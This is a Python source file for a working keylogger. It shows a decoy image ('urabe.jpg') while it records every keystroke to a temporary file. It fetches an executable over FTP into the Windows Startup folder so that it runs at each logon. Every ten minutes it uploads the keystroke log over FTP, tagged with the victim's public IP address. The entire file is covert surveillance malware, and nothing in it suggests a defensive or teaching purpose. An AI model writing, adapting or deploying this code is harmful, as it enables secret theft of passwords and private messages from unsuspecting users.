from pynput import keyboard
from PIL import Image
import time
import ftplib
import os
import requests
import tempfile
import threading
import sys

tempdir = tempfile.gettempdir()
filename = os.path.join(tempdir, 'file')

if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
else:
    base_path = os.path.dirname(__file__)

def ftpUpload():
    HOSTNAME = "localhost"
    USERNAME = "Frankom"
    PASSWORD = "123"
    IPAddr = requests.get("https://api.ipify.org/?format=json").json()['ip']
    filename2 = 'file-'+IPAddr
    ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)
    with open(filename, 'rb') as f:
        ftp_server.storbinary(f"APPE {filename2}", f)

def on_press(key):
    with open(filename, 'a') as f:
        f.write(str(key)+' ')

Image.open(os.path.join(base_path, 'urabe.jpg')).show()

with open(filename, 'a') as f:
    f.write('')

def addToAutostart():
    appdata = os.path.join(os.getenv("APPDATA"), "Microsoft/Windows/Start Menu/Programs/Startup/main.exe")
    HOSTNAME = "localhost"
    USERNAME = "Frankom"
    PASSWORD = "123"
    ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)
    with open(appdata, 'wb') as f:
        ftp_server.retrbinary(f"RETR main.exe", f.write)

addToAutostart()

listener = keyboard.Listener(on_press=on_press)
listener.start()

def every10mins():
    while True:
        time.sleep(600)
        ftpUpload()
        os.remove(filename)

thread = threading.Thread(target=every10mins, daemon=True)
thread.start()

while True:
    time.sleep(1)